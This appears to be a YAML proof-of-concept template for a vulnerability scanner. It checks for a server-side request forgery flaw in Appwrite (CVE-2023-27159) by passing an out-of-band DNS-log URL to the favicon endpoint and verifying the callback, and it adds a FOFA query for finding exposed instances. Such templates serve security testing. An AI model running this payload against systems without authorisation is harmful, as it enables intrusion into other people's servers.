id: poc-yaml-appwrite-ssrf
info:
  name: Appwrite 服务器端请求伪造漏洞(CVE-2023-27159)
  severity: high
  tags:
  - DNSLOG
  - ssrf
  - CVE-2023-27159
  finger: appwrite
  fofa: title:"Sign In - Appwrite"
variables:
  reverse: new_dns_log()
  reverseDomain: reverse.Domain()
requests:
- method: GET
  path: /v1/avatars/favicon?url=http://{{.reverseDomain}}
  expression: 'status_code == 404

    && contains(body,"App.php")

    && contains(headers,"Appwrite")

    && reverse.Verify()

    '
transport: http
